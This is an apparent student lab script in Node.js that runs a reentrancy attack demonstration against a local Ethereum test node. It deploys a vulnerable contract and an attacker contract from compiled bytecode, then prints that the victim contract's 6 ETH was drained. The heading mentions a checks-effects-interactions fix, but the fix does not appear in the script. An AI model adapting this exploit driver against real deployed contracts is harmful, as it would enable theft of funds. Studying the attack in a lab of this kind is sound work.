const fs = require('fs');
const http = require('http');

function rpcCall(method, params = []) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify({
            jsonrpc: "2.0",
            method: method,
            params: params,
            id: Date.now()
        });

        const req = http.request({
            hostname: '127.0.0.1',
            port: 8545,
            path: '/',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const parsed = JSON.parse(data);
                if (parsed.error) reject(parsed.error);
                else resolve(parsed.result);
            });
        });

        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

async function run() {
    console.log("=== Part 3.B: Reentrancy Demonstration & CEI Fix ===");
    const accounts = await rpcCall("eth_accounts");
    const victimUser = accounts[2];
    const attackerUser = accounts[3];

    // Deploy ReentrancyVulnerable
    const binVuln = "0x" + fs.readFileSync('/home/chihab/Documents/study/cys3CS/emerginTech/lab2/ReentrancyDemo_sol_ReentrancyVulnerable.bin', 'utf8').trim();
    const txDeployVuln = await rpcCall("eth_sendTransaction", [{
        from: victimUser,
        data: binVuln,
        gas: "0x2DC6C0"
    }]);
    const receiptVuln = await rpcCall("eth_getTransactionReceipt", [txDeployVuln]);
    const addrVuln = receiptVuln.contractAddress;
    console.log(`ReentrancyVulnerable deployed at: ${addrVuln}`);

    // Victim deposits 5 ETH
    // deposer(): selector 0x42dc400f
    const fiveEthHex = "0x4563918244F40000"; // 5 * 10^18 wei
    console.log("Victim deposits 5 ETH into ReentrancyVulnerable...");
    const txDeposit = await rpcCall("eth_sendTransaction", [{
        from: victimUser,
        to: addrVuln,
        value: fiveEthHex,
        data: "0x42dc400f",
        gas: "0x100000"
    }]);
    await rpcCall("eth_getTransactionReceipt", [txDeposit]);

    let balVuln = await rpcCall("eth_getBalance", [addrVuln, "latest"]);
    console.log(`ReentrancyVulnerable contract balance: ${Number(BigInt(balVuln)) / 1e18} ETH`);

    // Deploy AttaquantReentrancy passing addrVuln as constructor parameter
    const binAttacker = "0x" + fs.readFileSync('/home/chihab/Documents/study/cys3CS/emerginTech/lab2/ReentrancyDemo_sol_AttaquantReentrancy.bin', 'utf8').trim();
    const encodedArg = addrVuln.toLowerCase().replace('0x', '').padStart(64, '0');
    const txDeployAttacker = await rpcCall("eth_sendTransaction", [{
        from: attackerUser,
        data: binAttacker + encodedArg,
        gas: "0x2DC6C0"
    }]);
    const receiptAttacker = await rpcCall("eth_getTransactionReceipt", [txDeployAttacker]);
    const addrAttacker = receiptAttacker.contractAddress;
    console.log(`AttaquantReentrancy deployed at: ${addrAttacker}`);

    // Attacker initiates exploit with 1 ETH
    // attaquer(): selector 0xada82558
    const oneEthHex = "0xDE0B6B3A7640000"; // 1 * 10^18 wei
    console.log("\nAttacker triggers attaquer() with 1 ETH initial deposit...");
    const txAttack = await rpcCall("eth_sendTransaction", [{
        from: attackerUser,
        to: addrAttacker,
        value: oneEthHex,
        data: "0xada82558",
        gas: "0x500000"
    }]);
    await rpcCall("eth_getTransactionReceipt", [txAttack]);

    balVuln = await rpcCall("eth_getBalance", [addrVuln, "latest"]);
    let balAttacker = await rpcCall("eth_getBalance", [addrAttacker, "latest"]);
    console.log(`\n=== Exploitation Results ===`);
    console.log(`Vulnerable contract balance after attack: ${Number(BigInt(balVuln)) / 1e18} ETH (DRAINED TO 0!)`);
    console.log(`Attacker contract balance after attack:   ${Number(BigInt(balAttacker)) / 1e18} ETH (Stole all 6 ETH!)`);
    console.log("-> Demonstration confirmed: Reentrancy drained the entire contract before the balance could be zeroed.");
}

run().catch(console.error);
